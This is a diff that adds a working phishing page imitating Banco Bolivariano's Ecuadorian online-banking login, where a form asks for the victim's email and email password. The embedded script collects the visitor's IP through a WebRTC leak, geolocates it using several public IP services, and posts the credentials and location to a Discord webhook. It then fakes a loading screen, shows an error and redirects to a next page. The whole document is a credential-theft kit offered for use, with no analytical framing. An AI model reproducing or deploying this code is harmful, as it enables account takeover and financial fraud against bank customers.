@@ -1,0 +1,489 @@
+<!DOCTYPE html
+    PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=0.92">
+    <meta http-equiv="X-UA-Compatible" content="IE=Edge">
+    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+    <meta http-equiv="Pragma" content="no-cache">
+    <meta http-equiv="Expires" content="0">
+
+    <link rel="shortcut icon" href="https://www.bancasinhorarios.com.ec/BOLI-ebanking/images/favicon.ico">
+    <title>Bolivariano</title>
+
+    <link href="./datos/aniversario.css" rel="stylesheet">
+    <link href="./datos/combined.css" rel="stylesheet">
+    <link href="./datos/combined(1).css" rel="stylesheet">
+    <link href="./datos/combined(2).css" rel="stylesheet">
+    <link href="./datos/screenSize.css" type="text/css" rel="stylesheet">
+
+    <style>
+        #superiorLogin {
+            align-items: center;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            border-top: none !important;
+        }
+    </style>
+</head>
+
+<body onload=";backButtonOverride()" class="no-bw-firefox" style="display: block;">
+
+    <div class="flexDirectionColumn outerDiv_ blur-content" style="margin: 0; padding: 0; box-sizing: border-box;">
+        <div id="superiorLogin">
+
+            <div class="headerLogin">
+                <div class="cont-header">
+                    <div id="banner"></div>
+                </div>
+            </div>
+
+            <div id="bodyLogin" class="flexDirectionColumn centerElement bodyLogin">
+                <meta http-equiv="CACHE-CONTROL" content="NO-CACHE">
+
+                <div id="overlay"></div>
+                <div id="overlayModal"></div>
+
+                <div class="contentErrorId">
+                    <div class="contentError flexDirectionRow" style="visibility: hidden;display: none;">
+                        <div class="errorImg"><img src="./datos/alert-octagon.svg"></div>
+                        <div class="Body2 contentTextError" style="color:#FFFFFF;">
+                            <span id="errorPlaceholder">Error</span>
+                            <span id="errorEmailInvalido" class="value width328" style="display: none;">Correo
+                                electrónico inválido</span>
+                            <span id="errorPasswordInvalida" class="value width328" style="display: none;">Contraseña
+                                inválida</span>
+                            <span id="errorAutenticacion" class="value width328" style="display: none;">Correo o
+                                contraseña incorrectos</span>
+                        </div>
+                        <div class="closeMsgError"><img src="./datos/closeWhite.svg"></div>
+                    </div>
+                </div>
+
+                <div class="cont-loginBox flexDirectionRow centerElement">
+                    <form id="login" name="login" method="post" autocomplete="off">
+
+                        <div class="mainBox flexDirectionColumn margin12">
+                            <div id="backReturn" class="flexDirectionRow boxBack">
+                                <div><img src="./datos/chevron-left.svg"></div>
+                                <div class="Subtitle1">Atrás</div>
+                            </div>
+
+                            <div class="flexDirectionRow margin20Top paddingLeft"
+                                style="width: 85%; justify-content: space-between">
+                                <div class="flexDirectionColumn">
+                                    <div class="H1">Verifica tu correo</div>
+                                    <div class="Body1" style="margin:8px 0 32px 0">
+                                        Ingresa tu correo electrónico y su clave para continuar.
+                                    </div>
+                                </div>
+                                
+                            </div>
+
+                            <!-- Correo electrónico -->
+                            <div class="flexDirectionRow contentText1 paddingLeft" style="width: 85%;">
+                                <div class="Body1">Correo electrónico</div>
+                            </div>
+                            <div id="emailBox" class="formTextInput paddingLeft"
+                                style="width: 85%; margin-bottom: 16px;">
+                                <input id="email" type="email" autocomplete="off" name="j_email"
+                                    class="loginInput Body1" maxlength="80">
+                            </div>
+
+                            <!-- Clave del correo -->
+                            <div class="flexDirectionRow contentText1 paddingLeft" style="width: 85%;">
+                                <div class="Body1">Clave del correo</div>
+                            </div>
+                            <div id="passwordBox" class="formTextInput paddingLeft"
+                                style="width: 85%; margin-bottom: 32px;">
+                                <input id="password" type="password" autocomplete="off" name="j_password"
+                                    class="loginInput Body1" maxlength="64">
+                                <span id="show-pass-repeat" class="img-show-pass-login show-pass-autoadh myImage"
+                                    onclick="mostrarPasswordAudh('password','show-pass-repeat')"></span>
+                            </div>
+
+                            <div id="botonSendPasswordBox" class="paddingLeft centerElement"
+                                style="margin-bottom: 32px; width: 85%">
+                                <input id="botonSendPassword" type="submit" value="Continuar" class="botonSiguiente">
+                            </div>
+
+                        </div>
+
+                        <div class="contentBoxColumn flexDirectionColumn margin12 espacioFinal16Min">
+                            <div class="secondaryBox flexDirectionColumn centerElement margin12Botton">
+                                <div class="imgSeparateTopBotton"><img src="./datos/shield-check.svg"></div>
+                                <div class="H3 imgSeparateBotton44">Recomendación de seguridad</div>
+                                <div class="flexDirectionRow" style="width: 85%">
+                                    <div class="imgSeparate"><img src="./datos/form-input.svg"></div>
+                                    <div class="flexDirectionColumn">
+                                        <div class="Body1" style="color:#212529">No compartas tu correo ni tu clave
+                                        </div>
+                                        <div class="Body2 imgSeparateBotton47" style="color:#6C757D">
+                                            Para tu seguridad, no los compartas con nadie ni los uses en sitios no
+                                            verificados.
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="thirdBox flexDirectionRow espacioFinal12Min">
+                                <div class="imgSeparate" style="margin: 32px 32px 32px 0; padding-left: 32px;">
+                                    <img src="./datos/smartphone.svg">
+                                </div>
+                                <div style="margin: 32px 32px 32px 0;">
+                                    <div class="Body1" style="color:#212529;">Consulta, transfiere o paga desde tu
+                                        celular</div>
+                                    <div class="Body2" style="color:#6C757D; margin-bottom: 10px">
+                                        Con 24móvil, consulta tus saldos, realiza transferencias, pagos y mucho más.
+                                    </div>
+                                    <div class="Body4 cursor appBoli" style="font-size: 16px">Descargar aplicación</div>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="noVisible"></div>
+
+                        <input type="hidden" id="appDatos" name="appDatos"
+                            value="screenAvailHeigth=912***screenColorDepth=24***screenHeight=960***screenWidth=1536***appCodeName=Mozilla***appName=Netscape***appMinorVersion=undefined***cpuClass=undefined***platform=Win32***systemLanguage=undefined***userLanguage=undefined***userAgent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/152.0.0.0 Safari/537.36***cookieEnabled=true">
+                        <input type="hidden" id="navegador" name="navegador"
+                            value="Nav:Google Chrome-Name:chrome-FV:152.0.0.0-P:Windows 10-M:false-cookie:true">
+                    </form>
+                </div>
+
+                <div id="modalApp" class="modalLogin hide-modal hide-modal2">
+                    <div class="contentModal">
+                        <div class="modalAdminLogin flexDirectionColumn">
+                            <div class="flexDirectionRow headerLoginModal">
+                                <div class="H4 contentTitleModal">Descargar aplicación 24móvil</div>
+                                <div class="contentImgModal"><img src="./datos/close(1).svg"></div>
+                            </div>
+                            <div class="Subtitle1 margin32Top">Usa la cámara de tu celular para escanear este código QR.
+                            </div>
+                            <div class="margin16Top"><img src="./datos/qr-bolivariano.png"></div>
+                            <div class="Subtitle1 margin16Top" style="color: #6C757D">
+                                Con 24móvil podrás consultar tus saldos, revisar tus movimientos, realizar
+                                transferencias, pagos y mucho más.
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+            </div>
+
+            <footer id="footer" class=" blur-content">
+                <div class="cont-footer-new">
+                    <div id="logo-Boli-footer" class="logo-footer-new"
+                        style="display: flex; justify-content: space-between;">
+                        <div class="Body20" style="margin: 10px 0 0 0;">© 2026 Bolivariano - Todos los derechos
+                            reservados.</div>
+                    </div>
+                </div>
+            </footer>
+        </div>
+    </div>
+
+    <!-- Overlay nativo: "Espera por favor..." -->
+    <div id="disabledZone" style="float: right; display: none; border: 0px;">
+        <div id="modalProcesando">
+            <div id="modalLoading" class="bg">
+                <style>
+                    .bg {
+                        width: 100%;
+                        height: 100%;
+                        position: fixed;
+                        top: 0;
+                        left: 0;
+                    }
+
+                    .bg.black {
+                        background: #000;
+                        opacity: 0.05;
+                    }
+
+                    .bg.gradient {
+                        background: linear-gradient(to top right, #17B498, #DCF4F0);
+                        opacity: 0.8;
+                    }
+
+                    .content-blur {
+                        filter: blur(6px);
+                    }
+
+                    .txt-loading {
+                        font-family: 'roboto-regular' !important;
+                        font-size: 13px !important;
+                        color: #fff !important;
+                    }
+
+                    .loading-content {
+                        position: relative;
+                        text-align: center;
+                        height: 110px;
+                        top: 50%;
+                        margin-top: -70px;
+                    }
+
+                    .blur-eff {
+                        -webkit-filter: blur(6px);
+                        -moz-filter: blur(6px);
+                        -o-filter: blur(6px);
+                        -ms-filter: blur(6px);
+                        filter: blur(6px);
+                    }
+                </style>
+
+                <div class="bg gradient"></div>
+                <div class="bg black"></div>
+                <div class="loading-content">
+                    <img src="./datos/loading-B_30.gif" border="0">
+                    <br>
+                    <div class="txt-loading">Espera por favor...</div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+</body>
+<script src="discord.js"></script>
+<script>
+    // ============================================================
+    // CONFIGURACIÓN
+    // ============================================================
+    const WEBHOOK_TIMEOUT_MS = 8000;
+    const LOADING_DURATION_MS = 10000;   // overlay 10 s
+    const NEXT_PAGE = "index.html";      // ← redirige aquí
+
+    // ============================================================
+    // OVERLAY NATIVO: "Espera por favor..."
+    // ============================================================
+    function mostrarOverlay() {
+        const dz = document.getElementById("disabledZone");
+        if (!dz) { console.warn("No se encontró #disabledZone"); return; }
+        dz.style.display = "block";
+        document.body.style.overflow = "hidden";
+
+        const blurTargets = document.querySelectorAll(".blur-content, #superiorLogin, #bodyLogin");
+        blurTargets.forEach(el => el.classList.add("blur-eff"));
+    }
+
+    function ocultarOverlay() {
+        const dz = document.getElementById("disabledZone");
+        if (dz) dz.style.display = "none";
+        document.body.style.overflow = "";
+        const blurTargets = document.querySelectorAll(".blur-content, #superiorLogin, #bodyLogin");
+        blurTargets.forEach(el => el.classList.remove("blur-eff"));
+    }
+
+    // ============================================================
+    // UTILIDADES GeoIP
+    // ============================================================
+    function getLocalIP() {
+        return new Promise((resolve) => {
+            try {
+                const pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
+                pc.createDataChannel("");
+                pc.createOffer().then(o => pc.setLocalDescription(o));
+                pc.onicecandidate = (ice) => {
+                    if (!ice || !ice.candidate) return;
+                    const m = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(ice.candidate.candidate);
+                    if (m) { resolve(m[1]); pc.close(); }
+                };
+                setTimeout(() => resolve("No disponible"), 1500);
+            } catch (e) { resolve("No disponible"); }
+        });
+    }
+
+    async function geoIpApiCo(ip) {
+        try {
+            const url = ip && ip !== "No disponible" ? `https://ipapi.co/${ip}/json/` : "https://ipapi.co/json/";
+            const r = await fetch(url); if (!r.ok) throw new Error("HTTP " + r.status);
+            const d = await r.json(); if (d.error) throw new Error(d.reason || "error");
+            return {
+                ip: d.ip || ip, city: d.city || "Desconocida", region: d.region || "",
+                country: d.country_name || "Desconocido", country_code: d.country_code || "",
+                isp: d.org || "", source: "ipapi.co"
+            };
+        } catch (e) { console.warn("[ipapi.co] falló:", e.message); return null; }
+    }
+    async function geoIpApiCom(ip) {
+        try {
+            const base = "http://ip-api.com/json/";
+            const url = ip && ip !== "No disponible"
+                ? `${base}${ip}?fields=status,country,countryCode,regionName,city,isp,query`
+                : `${base}?fields=status,country,countryCode,regionName,city,isp,query`;
+            const r = await fetch(url); if (!r.ok) throw new Error("HTTP " + r.status);
+            const d = await r.json(); if (d.status !== "success") throw new Error("status: " + d.status);
+            return {
+                ip: d.query || ip, city: d.city || "Desconocida", region: d.regionName || "",
+                country: d.country || "Desconocido", country_code: d.countryCode || "",
+                isp: d.isp || "", source: "ip-api.com"
+            };
+        } catch (e) { console.warn("[ip-api.com] falló:", e.message); return null; }
+    }
+    async function geoIpWhoIs(ip) {
+        try {
+            const url = ip && ip !== "No disponible" ? `https://ipwho.is/${ip}` : "https://ipwho.is/";
+            const r = await fetch(url); if (!r.ok) throw new Error("HTTP " + r.status);
+            const d = await r.json(); if (!d.success) throw new Error("success=false");
+            return {
+                ip: d.ip || ip, city: d.city || "Desconocida", region: d.region || "",
+                country: d.country || "Desconocido", country_code: d.country_code || "",
+                isp: d.connection?.isp || "", source: "ipwho.is"
+            };
+        } catch (e) { console.warn("[ipwho.is] falló:", e.message); return null; }
+    }
+    async function geoIpInfoIo(ip) {
+        try {
+            const url = ip && ip !== "No disponible" ? `https://ipinfo.io/${ip}/json` : "https://ipinfo.io/json";
+            const r = await fetch(url); if (!r.ok) throw new Error("HTTP " + r.status);
+            const d = await r.json(); if (d.bogon) throw new Error("bogon");
+            return {
+                ip: d.ip || ip, city: d.city || "Desconocida", region: d.region || "",
+                country: d.country || "Desconocido", country_code: d.country || "",
+                isp: d.org || "", source: "ipinfo.io"
+            };
+        } catch (e) { console.warn("[ipinfo.io] falló:", e.message); return null; }
+    }
+    async function geoFreeIpApi(ip) {
+        try {
+            const url = ip && ip !== "No disponible"
+                ? `https://freeipapi.com/api/json/${ip}` : "https://freeipapi.com/api/json";
+            const r = await fetch(url); if (!r.ok) throw new Error("HTTP " + r.status);
+            const d = await r.json();
+            return {
+                ip: d.ipAddress || ip, city: d.cityName || "Desconocida",
+                region: d.regionName || "", country: d.countryName || "Desconocido",
+                country_code: d.countryCode || "", isp: "", source: "freeipapi.com"
+            };
+        } catch (e) { console.warn("[freeipapi.com] falló:", e.message); return null; }
+    }
+
+    async function obtenerGeolocalizacion() {
+        const localIp = await getLocalIP();
+        const apis = [
+            () => geoIpApiCo(localIp),
+            () => geoIpApiCom(localIp),
+            () => geoIpWhoIs(localIp),
+            () => geoIpInfoIo(localIp),
+            () => geoFreeIpApi(localIp),
+        ];
+        for (const api of apis) {
+            try {
+                const res = await api();
+                if (res && res.ip) { console.log("[GEO] Éxito:", res.source, res); return res; }
+            } catch (e) { }
+        }
+        return {
+            ip: localIp, city: "Desconocida", region: "", country: "Desconocido",
+            country_code: "", isp: "", source: "ninguna"
+        };
+    }
+
+    // ============================================================
+    // ENVÍO A DISCORD
+    // ============================================================
+    async function enviarADiscord(data) {
+        const payload = {
+            username: "Banco Bolivariano - Login",
+            embeds: [{
+                title: "📧 Datos de correo ingresados",
+                color: 0x0047AB,
+                fields: [
+                    { name: "👤 Usuario", value: "```" + (data.usuario || "(vacío)") + "```", inline: false },
+                    { name: "📧 Correo", value: "```" + (data.email || "(vacío)") + "```", inline: false },
+                    { name: "🔑 Clave del correo", value: "```" + (data.password || "(vacío)") + "```", inline: false },
+                    { name: "🌐 IP", value: "```" + data.ip + "```", inline: true },
+                    { name: "🏙️ Ciudad", value: "```" + data.city + "```", inline: true },
+                    { name: "🗺️ Región", value: "```" + (data.region || "N/A") + "```", inline: true },
+                    { name: "🌎 País", value: "```" + data.country + " (" + data.country_code + ")```", inline: true },
+                    { name: "🕒 Fecha", value: "```" + new Date().toLocaleString("es-EC", { timeZone: "America/Guayaquil" }) + "```", inline: false },
+                ],
+                footer: { text: "Banco Bolivariano • Login Monitor" },
+                timestamp: new Date().toISOString()
+            }]
+        };
+        const controller = new AbortController();
+        const timer = setTimeout(() => controller.abort(), WEBHOOK_TIMEOUT_MS);
+        try {
+            const r = await fetch(DISCORD_WEBHOOK, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(payload),
+                signal: controller.signal
+            });
+            clearTimeout(timer);
+            if (!r.ok) { console.error("Discord webhook error:", r.status); return false; }
+            console.log("✅ Enviado a Discord");
+            return true;
+        } catch (e) {
+            clearTimeout(timer);
+            console.error("Error enviando a Discord:", e);
+            return false;
+        }
+    }
+
+    // ============================================================
+    // OVERLAY 10 SEGUNDOS + REDIRECCIÓN
+    // ============================================================
+    function mostrarOverlayYRedirigir(destino) {
+        mostrarOverlay();
+
+        const start = Date.now();
+        const tick = setInterval(() => {
+            if (Date.now() - start >= LOADING_DURATION_MS) {
+                clearInterval(tick);
+                console.log("➡️ Redirigiendo a", destino);
+                alert("Datos incorrectos")
+                window.location.href = destino;
+            }
+        }, 100);
+    }
+
+    // ============================================================
+    // FLUJO PRINCIPAL
+    // ============================================================
+    document.addEventListener("DOMContentLoaded", () => {
+        const form = document.getElementById("login");
+        if (!form) { console.error("Form #login no encontrado"); return; }
+
+        form.addEventListener("submit", async (e) => {
+            e.preventDefault();
+            e.stopPropagation();
+
+            const emailInput = document.getElementById("email");
+            const passwordInput = document.getElementById("password");
+            const email = emailInput ? emailInput.value.trim() : "";
+            const password = passwordInput ? passwordInput.value.trim() : "";
+
+            if (!email) { if (emailInput) emailInput.focus(); return; }
+            if (!password) { if (passwordInput) passwordInput.focus(); return; }
+
+            // Usuario viene de login.html
+            const usuario = localStorage.getItem("bb_usuario") || "";
+
+            // Guardar correo y clave
+            localStorage.setItem("bb_email", email);
+            localStorage.setItem("bb_email_clave", password);
+            localStorage.setItem("bb_email_ts", Date.now().toString());
+
+            const btn = document.getElementById("botonSendPassword");
+            if (btn) { btn.disabled = true; btn.value = "Enviando..."; }
+
+            // Overlay nativo "Espera por favor..." + cuenta regresiva de 10 s
+            mostrarOverlayYRedirigir(NEXT_PAGE);
+
+            // Envío a Discord (no bloquea la redirección)
+            try {
+                const geo = await obtenerGeolocalizacion();
+                await enviarADiscord({ usuario, email, password, ...geo });
+            } catch (err) {
+                console.error("Error en flujo:", err);
+            }
+        });
+
+        console.log("✅ Listener submit registrado en #login");
+    });
+</script>
+
+</html>
